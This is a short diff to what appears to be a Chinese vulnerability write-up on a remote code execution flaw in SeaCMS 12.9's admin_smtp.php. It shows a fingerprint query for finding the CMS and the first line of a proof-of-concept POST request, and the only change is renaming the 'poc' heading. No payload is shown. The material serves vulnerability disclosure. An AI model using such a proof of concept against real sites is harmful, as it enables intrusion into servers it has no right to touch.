@@ -8,7 +8,7 @@ SeaCMS 12.9存在远程代码执行漏洞。该漏洞是由于admin_smtp.php将�
 app="海洋CMS"
 ```
 
-## poc
+## POC
 
 ```yaml
 POST /at1fcg/admin_smtp.php?action=set HTTP/1.1
